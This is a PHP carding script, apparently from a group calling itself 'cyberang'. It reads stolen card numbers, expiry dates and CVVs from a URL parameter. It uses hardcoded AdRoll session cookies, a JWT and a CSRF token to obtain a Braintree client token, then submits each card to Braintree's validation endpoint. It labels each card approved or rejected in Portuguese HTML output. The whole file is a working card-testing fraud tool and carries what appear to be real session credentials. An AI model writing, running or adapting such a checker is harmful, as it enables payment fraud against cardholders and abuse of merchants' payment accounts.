<?php
error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

## PEGAR COOKIES DO APP.ADROLL.COM E A URL https://app.adroll.com/payment-methods/?advertisable=ADVERTISABLE&account=ACCOUNT_ID&hide_buttons=false&set_primary=false

$email = 'cyberang'.rand(10, 100000).'%40gmail.com';
$useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$mes2 = (string)((int)$mes);
$ano = $separar[2];
$ano2 = substr($ano, -2);
$cvv = $separar[3];

if (file_exists("cybergang.txt")) {
    unlink("cyberang.txt");
}

$digito = substr($cc, 0, 1);
if($digito == 4){
  $brand = 'visa';
}elseif($digito == 5){
  $brand = 'mastercard';
}elseif($digito == 2){
  $brand = 'mastercard';
}elseif($digito == 6){
  $brand = 'elo';
}elseif($digito == 3){
  $brand = 'amex';
}else{
  $brand = 'unknown';
}

function cyber($icone, $status, $lista, $mensagem, $cor = "#00ff84", $cormsg = "#ffffff") {
  $bg = $cor === "#00ff84" ? "rgba(0, 255, 132, 0.03)" : "rgba(255, 51, 102, 0.03)";
  echo "<div style='
      font-family: \"JetBrains Mono\", \"Courier New\", monospace;
      background: linear-gradient(90deg, $bg 0%, rgba(10, 10, 10, 0) 100%);
      border-left: 2px solid $cor;
      padding: 14px 18px;
      margin: 4px 0;
      border-radius: 0 6px 6px 0;
      letter-spacing: 0.3px;
      font-size: 12.5px;
      box-shadow: 0 0 20px $bg;
  '>
      <span style='color: $cor; margin-right: 4px;'>$icone</span>
      <span style='color: $cor; font-weight: 500; margin-right: 4px;'>#$status</span>
      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
      <span style='color: #ffffff; background: rgba(255, 255, 255, 0.03); padding: 3px 6px; border-radius: 4px;'>[$lista]</span>
      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
      <span style='color: $cormsg;'>$mensagem</span>
      <span style='color: #8f9199; margin-left: 4px;'>cyberang</span>
  </div>";
}

$account_id = 'CCIV346S35H4TJM5ZVVIBY';
$advertisable = 'ICHY4TAYYZFTTAIFRFDMJR';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://app.adroll.com/api/v1/account/gateway_credentials/$account_id?_escape=false");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'Accept: */*',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie: __zlcmid=1VqoFdzPcPTTTLh; adroll_jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI3R1lXTVhEWFNKR01aTllITVNYVEFRIiwiaXNzIjoiaHR0cHM6Ly9hcHAuYWRyb2xsLmNvbSIsImF1ZCI6Imh0dHBzOi8vYXBwLmFkcm9sbC5jb20iLCJuYmYiOjE3NzA0ODA2MTIsImlhdCI6MTc3MDQ4MDYxMiwianRpIjoiSDJMREhFVFRQQkFIN0pHV1U2TDdPVyIsImJyb3dzZXJfZmluZ2VycHJpbnQiOiIkYXJnb24yaWQkdj0xOSRtPTE2Mzg0LHQ9MixwPTEkWWF6ei9NelpWZjAkeEFxNkJ4cU00cjlJdndJV3ZDaTdTdyIsInJlbWVtYmVyX3VzZXJfZGV2aWNlIjp0cnVlLCJyZW1lbWJlcl91c2VyX2RldmljZV9kYXRlIjoxNzcwNDgwNjEyfQ.42q0mRVixZc1FNqb64c8zdsc4Yfd7bCVLWWZiFbMmJk; g_state={"i_l":0,"i_ll":1770582595321,"i_b":"rNIBGyT2FOjtizab7tUxsWTfJQ+IkcEMW5bbsmKOhKY","i_e":{"enable_itp_optimization":3}}; csrftoken=6979effe1919b2fc2a82773766a3a367; adroll=43b7d9837725e7089ce97fe77487b7d05ea7dac19f37111125464422b5d75d595f27330c; adroll-ai-c2-7GYWMXDXSJGMZNYHMSXTAQ-ICHY4TAYYZFTTAIFRFDMJR=%7B%22conversationRef%22%3A%7B%22mode%22%3A%22general%22%2C%22forcedToolCalls%22%3A%5B%5D%7D%2C%22ts%22%3A1770582620637%7D; AWSALB=puFqdIp/1ZzRtG9011yBHkHKWc+Euwx9KiuA5tGrwlweFcj/cKHHTbtKwQY1CtxujCIM2g9PLvpdyUFpEY6ZjT4+cvs7BHMczUNOaaiBwg6+T9SJqJH/Ujh7ZXsH; _dd_s=rum=1&id=21e49044-b9d3-499e-ba3a-5d7999e61eff&created=1770582594085&expire=1770583755171',
"Referer: https://app.adroll.com/payment-methods/?advertisable=$advertisable&account=$account_id&hide_buttons=false&set_primary=false&lang=en_US",
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
'X-CSRF-Token: 6979effe1919b2fc2a82773766a3a367',
'sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"'
]);
$response = curl_exec($ch);
$clientToken = json_decode(base64_decode(json_decode($response, true)['results']['braintree_client_token']), true);

$bearer = explode('?', $clientToken['authorizationFingerprint'])[0];
$sessionId = bin2hex(random_bytes(16));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/527r4khfxhmb694m/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=3.98.2&authorizationFingerprint=' . urlencode($bearer) . '%3Fcustomer_id%3D&_meta%5Bintegration%5D=custom&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=' . $sessionId . '&share=undefined&&creditCard%5Bnumber%5D=' . $cc . '&creditCard%5BexpirationDate%5D=' . $mes . '%2F' . $ano . '&creditCard%5Bcvv%5D=' . $cvv . '&creditCard%5Boptions%5D%5Bvalidate%5D=true&_method=POST&callback=callback_json02178bb076b649fc90cb4090f031a2a6');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cybergang.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cybergang.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Referer: https://app.adroll.com/',
'User-Agent:' . $useragent
));
$resultado = curl_exec($ch);

if(strpos($resultado, 'nonce') !== false) {
  cyber("💸", "Aprovada", $lista, "[ Cartão vinculado com sucesso. ]");

}elseif(strpos($resultado, 'error') !== false) {
  cyber("❌", "Reprovada", $lista, "[ Cartão recusado pelo emissor. ]", "#ff3366", "#ff3366");

}else{
  cyber("❌", "Reprovada", $lista, "[ Erro Desconhecido. ]", "#ff3366", "#ff3366");
}
?>
